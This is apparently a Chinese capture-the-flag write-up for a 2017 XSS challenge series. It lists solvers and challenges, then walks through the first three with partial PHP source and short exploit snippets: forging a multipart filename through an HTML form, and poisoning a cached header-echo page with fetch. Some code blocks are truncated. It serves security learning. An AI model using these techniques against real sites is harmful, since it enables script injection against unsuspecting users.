# Xss挑战赛 - L3m0n writeup
    XSS#01. Mannix,L3m0n,Aegis,xq17,nearg1e,mogujie@蘑菇街,evi1m0,w4f05,phantom0301,blackwolf
    XSS#02. L3m0n,mogujie@蘑菇街,Aegis,evil7,PKAV
    XSS#03. L3m0n,mogujie@蘑菇街,Mazing
    XSS#04. zusheng,feiyu,Mannix,Evi14ui,L3m0n,V@1n3R,Scriptkid,xq17,Mathias,mogujie@蘑菇街,evi1m0,nearg1e,Mazing,Aegis,maya66,w4f05,RickyHao,DK,phantom0301
    XSS#05. evi1m0,zusheng,xq17,V@1n3R,riverheart(河流之心),L3m0n,Mathias,phantom0301
    XSS#06. Flyin9(数据流),xq17,kingdom017,L3m0n,evi1m0,evil7,Mathias,DK,Scriptkid,Aegis,phantom0301,blackwolf
    XSS#07. evi1m0,MagicBlue,L3m0n,riverheart(河流之心),xq17,Aegis,PKAV,RickyHao,Mathias
    XSS#08. PKAV,L3m0n
    XSS#09. L3m0n
    XSS#10. evi1m0,z0z,L3m0n,riverheart(河流之心),xq17,nearg1e,Mathias,phantom0301,Ox9A82
    XSS#11. L3m0n,nearg1e,evi1m0,RickyHao,Mathias
    XSS#12. L3m0n,Mathias,PKAV,phantom0301
    XSS#13. nearg1e,Mannix,p4ny,Scriptkid,xq17,L3m0n,Mathias,evi1m0,mogujie@蘑菇街,DK,maya66,wps2015,RickyHao,Aegis,riverheart(河流之心),PKAV,phantom0301,w4f05
    XSS#14. Mannix,Scriptkid,z0z,evi1m0,xq17,Evi14ui,p4ny,L3m0n,V@1n3R,feiyu,朽木,秋风,Mazing,raul17,Mathias,mogujie@蘑菇街,L1p,TaeJa,DK,omego,gethin,w4f05,小毒物,wps2015,RickyHao,Aegis,update,PKAV,blackwolf,nearg1e,ding13,phantom0301
    XSS#15. PKAV,L3m0n,evi1m0,Mathias
    XSS#16. L3m0n,riverheart(河流之心),xq17,Mannix,feiyu,evi1m0,PKAV,Mathias,RickyHao
    XSS#17. L3m0n,evi1m0,mogujie@蘑菇街,Mathias,nearg1e,Scriptkid,Aegis,仲ma,p4ny,DK,xq17,wps2015,evil7,PKAV,blackwol,Evi14ui,phantom0301,Ox9A82
    XSS#18. L3m0n,PKAV,evi1m0,xq17
    XSS#19. 落
    XSS#20. evil7,evi1m0
    番外篇#01. 落
### 0\. 说明
玩了挺久的一个挑战，整个过程中被虐到变形，感谢M师傅的小课堂，学习到很多新姿势.
**Writeup中的ref为M师傅出题的参考链接**
* * *
M师傅语录:  
题目很多围绕着security header来出题，希望开发者重视这些问题，在防御上，正确的设置下面的值，是能够避免很多问题.  
content-type、x-xss-protection、x-frame-options、x-content-type-options
* * *
挑战地址暂时关闭，后期会放出源代码
题目要求:  
所有XSS题目均可以通过让受害者访问特定的链接或页面的方式在受害者的浏览器&当前域下执行JavaScript。  
有些题目可能需要在特定的浏览器下完成。浏览器版本以Chrome60,Firefox55,Safari10,IE11,Edge40或更新版本为准。  
POC通过验证后我会把你的id添加到解题成功者的列表里。Have fun!
    XSS#01. 文件上传 (添加时间:2017-08-15)---->查看源码---->点我看提示
    XSS#02. getallheaders() (添加时间:2017-08-15)---->查看源码---->点我看提示
    XSS#03. json (添加时间:2017-08-15)---->查看源码---->点我看提示
    XSS#04. referrer (添加时间:2017-08-15)---->查看源码---->点我看提示
    XSS#05. 跳转 (添加时间:2017-08-15)---->查看源码---->点我看提示
    XSS#06. 强制下载 (添加时间:2017-08-15)---->查看源码---->点我看提示
    XSS#07. text/plain (添加时间:2017-08-15)---->查看源码---->点我看提示
    XSS#08. 标签 (添加时间:2017-08-15)---->查看源码---->点我看提示
    XSS#09. plaintext (添加时间:2017-08-16)---->查看源码---->点我看提示
    XSS#10. MVM (添加时间:2017-08-16)---->查看源码---->点我看提示
    XSS#11. HOST (添加时间:2017-08-17)->查看源码---->点我看提示
    XSS#12. preview (添加时间:2017-08-17)---->查看源码---->点我看提示
    XSS#13. REQUEST_URI (添加时间:2017-08-17)---->查看源码---->点我看提示
    XSS#14. HIDDEN (添加时间:2017-08-18)---->查看源码---->点我看提示
    XSS#15. Frame Buster (添加时间:2017-08-18)---->查看源码---->点我看提示
    XSS#16. PHP_SELF (添加时间:2017-08-18)---->查看源码---->点我看提示
    XSS#17. passive element (添加时间:2017-08-23)---->查看源码---->点我看提示
    XSS#18. Graduate (添加时间:2017-08-23)---->查看源码---->点我看提示
    XSS#19. Party (添加时间:2017-08-25)---->查看源码---->点我看提示
    XSS#20. The End (添加时间:2017-08-25)---->查看源码---->点我看提示
    番外篇#01. JQuery (此题属于番外篇，对排名没有影响。 添加时间:2017-08-27)---->查看源码---->点我看提示
### 1\. 文件上传
    ";
            $uploadOk = 1;
        } else {
            echo "File is not an image.";
            $uploadOk = 0;
        }
    }
    // Check if file already exists
    if (file_exists($target_file)) {
        echo "Sorry, file already exists.";
        $uploadOk = 0;
    }
    // Check file size
    if ($_FILES["fileToUpload"]["size"] > 500000) {
        echo "Sorry, your file is too large.";
        $uploadOk = 0;
    }
    // Allow certain file formats
    if($imageFileType != "jpg" && $imageFileType != "png" && $imageFileType != "jpeg"
    && $imageFileType != "gif" ) {
        echo "Sorry, only JPG, JPEG, PNG & GIF files are allowed.";
        $uploadOk = 0;
    }
    // Check if $uploadOk is set to 0 by an error
    if ($uploadOk == 0) {
        echo "Sorry, your file was not uploaded.";
    // if everything is ok, try to upload file
    } else {
            echo "The file ". basename( $_FILES["fileToUpload"]["name"]). " has been uploaded.";
    }
    ?>
此题xss点是在文件上传后，页面会显示文件名，但是有一个问题就是，如何自动化的利用？  
毕竟js上传文件有跨域问题，那么也就只能利用html表单
通过这样的思路找到还可以利用html表单上传文件?  
其实文件并没有上传，只是利用表单的name，闭合一下后添加了fielname
正常文件上传：
带有content-type
伪造文件上传:
不带有content-type，但是`$_FILES["fileToUpload"]["name"]`还是可以接受到值的
所以可以构造一下Exp:
     var tarfile = "test";
     var vuln = document.getElementById('vulnerable');
     vuln.name = "x\"; name=fileToUpload; filename=\".jpg";
     vuln.value = (tarfile);
     document.getElementById("xss").submit();
当时自己并非用的`textarea`标签，而是input，这个标签只能用到IE8，之后的版本会对双引号进行url编码
ref: 
### 2\. getallheaders()
     $value) {
        echo "$name: $value\n";
    }
    }
    ?>
此题就是会把HTTP所有信息输出到页面，但是不能使用Referrer  
问题也很明显，请求这个地址，而且又是能够利用代码自动化的添加头去请求.
这里面特别要注意的是开始的两个头
    header('Pragma: cache');
    header("Cache-Control: max-age=".(60*60*24*100));
也就是浏览器会对网页进行缓存，那么如果第一次我能够修改http头然后再进行跨域请求，第二次再请求一次的时候，http的信息还是不会变的，因为直接读取了本地缓存内容.
所以可以使用`Fetch`先请求，在利用iframe框架进行第二请求，另外注意的就是需要通过meta标签来设置一下referrer，也就是第二次iframe加载的时候是不带referer的.按道理可以在FF下面也成功，不过好像FF不支持meta这样禁止referer
Chrome Exp:  
    var request = new Request('http://xianzhi.aliyun.com/xss2.php', {
      method: 'GET',
      mode: 'no-cors',
      redirect: 'follow',
      headers: new Headers({
        'Content-Type': 'text/plain',
        'Accept': 'application/jsona',
      })
    });
    fetch(request).then(function() {
      console.log(1);
    });
ref: 
### 3\. json
这个题目问题在于返回头是`application/json`，又应该如何xss
这里利用了IE一个bug，参考文章：
IE11 Exp:  
3.html
3.php